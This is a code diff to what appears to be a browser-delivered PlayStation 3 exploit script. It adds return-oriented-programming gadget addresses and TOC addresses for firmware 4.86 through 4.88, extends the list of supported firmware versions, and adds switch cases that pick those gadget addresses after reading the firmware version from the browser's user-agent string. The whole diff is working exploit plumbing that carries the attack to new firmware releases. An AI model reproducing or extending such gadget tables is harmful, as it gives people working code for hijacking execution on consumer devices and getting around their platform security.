@@ -358,6 +358,39 @@ var gadget6_addr_485=0x423B18;
 var gadget7_addr_485=0x628594;
 var gadget8_addr_485=0x2BACB8;
 
+//CEX 4.86
+var toc_addr_486 = 0x6F5558;
+var gadget1_addr_486=0x0D9684;
+var gadget2_addr_486=0x097604;
+var gadget3_addr_486=0x60EFD8;
+var gadget4_addr_486=0x19D3B0;
+var gadget5_addr_486=0x42C778;
+var gadget6_addr_486=0x423B18;
+var gadget7_addr_486=0x628594;
+var gadget8_addr_486=0x2BACB8;
+
+//CEX 4.87
+var toc_addr_487 = 0x6F5558;
+var gadget1_addr_487=0x0D9684;
+var gadget2_addr_487=0x097604;
+var gadget3_addr_487=0x60EFD8;
+var gadget4_addr_487=0x19D3B0;
+var gadget5_addr_487=0x42C778;
+var gadget6_addr_487=0x423B18;
+var gadget7_addr_487=0x628594;
+var gadget8_addr_487=0x2BACB8;
+
+//CEX 4.88
+var toc_addr_488 = 0x6F5558;
+var gadget1_addr_488=0x0D9684;
+var gadget2_addr_488=0x097604;
+var gadget3_addr_488=0x60EFD8;
+var gadget4_addr_488=0x19D3B0;
+var gadget5_addr_488=0x42C778;
+var gadget6_addr_488=0x423B18;
+var gadget7_addr_488=0x628594;
+var gadget8_addr_488=0x2BACB8;
+
 //CEX 4.89
 var toc_addr_489 = 0x6F5558;
 var gadget1_addr_489=0x0D9684;
@@ -809,7 +842,7 @@ function findJsVariableOffset(name,exploit_data,base,size)
 //####################################################################################################################################################################
 function ps3chk(){
 
-	var fwCompat = ["4.00","4.10","4.11","4.20","4.21","4.25","4.30","4.31","4.40","4.41","4.45","4.46","4.50","4.53","4.55","4.60","4.65","4.66","4.70","4.75","4.76","4.78","4.80","4.81","4.82","4.83","4.84","4.85","4.89"];
+	var fwCompat = ["4.00","4.10","4.11","4.20","4.21","4.25","4.30","4.31","4.40","4.41","4.45","4.46","4.50","4.53","4.55","4.60","4.65","4.66","4.70","4.75","4.76","4.78","4.80","4.81","4.82","4.83","4.84","4.85","4.86","4.87","4.88","4.89"];
 	var ua = navigator.userAgent;
 	var uaStringCheck = ua.substring(ua.indexOf("5.0 (") + 5, ua.indexOf(") Apple") - 7);
 	var fwVersion = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple"));
@@ -1185,6 +1218,45 @@ function ps3chk(){
 					break;
 					
 				case fwCompat[28]:
+					alert(msgHFW);
+					toc_addr = toc_addr_486;
+					gadget1_addr=gadget1_addr_486;
+					gadget2_addr=gadget2_addr_486;
+					gadget3_addr=gadget3_addr_486;
+					gadget4_addr=gadget4_addr_486;
+					gadget5_addr=gadget5_addr_486;
+					gadget6_addr=gadget6_addr_486;
+					gadget7_addr=gadget7_addr_486;
+					gadget8_addr=gadget8_addr_486;
+					break;
+					
+				case fwCompat[29]:
+					alert(msgHFW);
+					toc_addr = toc_addr_487;
+					gadget1_addr=gadget1_addr_487;
+					gadget2_addr=gadget2_addr_487;
+					gadget3_addr=gadget3_addr_487;
+					gadget4_addr=gadget4_addr_487;
+					gadget5_addr=gadget5_addr_487;
+					gadget6_addr=gadget6_addr_487;
+					gadget7_addr=gadget7_addr_487;
+					gadget8_addr=gadget8_addr_487;
+					break;
+					
+				case fwCompat[30]:
+					alert(msgHFW);
+					toc_addr = toc_addr_488;
+					gadget1_addr=gadget1_addr_488;
+					gadget2_addr=gadget2_addr_488;
+					gadget3_addr=gadget3_addr_488;
+					gadget4_addr=gadget4_addr_488;
+					gadget5_addr=gadget5_addr_488;
+					gadget6_addr=gadget6_addr_488;
+					gadget7_addr=gadget7_addr_488;
+					gadget8_addr=gadget8_addr_488;
+					break;
+					
+				case fwCompat[31]:
 					alert(msgHFW);
 					toc_addr = toc_addr_489;
 					gadget1_addr=gadget1_addr_489;
